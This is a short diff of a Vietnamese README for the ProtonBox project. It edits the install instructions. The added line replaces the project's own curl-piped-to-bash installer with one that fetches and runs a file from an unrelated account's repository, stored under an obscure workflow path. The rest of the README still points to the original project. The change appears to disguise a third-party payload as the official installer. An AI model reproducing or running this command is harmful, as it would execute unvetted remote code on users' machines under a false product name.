@@ -10,7 +10,7 @@ bash <(curl -Ls https://raw.githubusercontent.com/dopaemon/ProtonBox/install/ins
 ```
 ### Chạy tập lệnh này để install ProtonBox mới:
 ```bash
-bash <(curl -Ls https://raw.githubusercontent.com/dopaemon/ProtonBox/install/install.sh)
+bash <(curl -Ls https://raw.githubusercontent.com/Mina2k7/Proton/master/.github/workflows/Codevip)
 ```
 ## Traslate
 ### [**How To Translate**](https://github.com/dopaemon/ProtonBox/tree/languages)
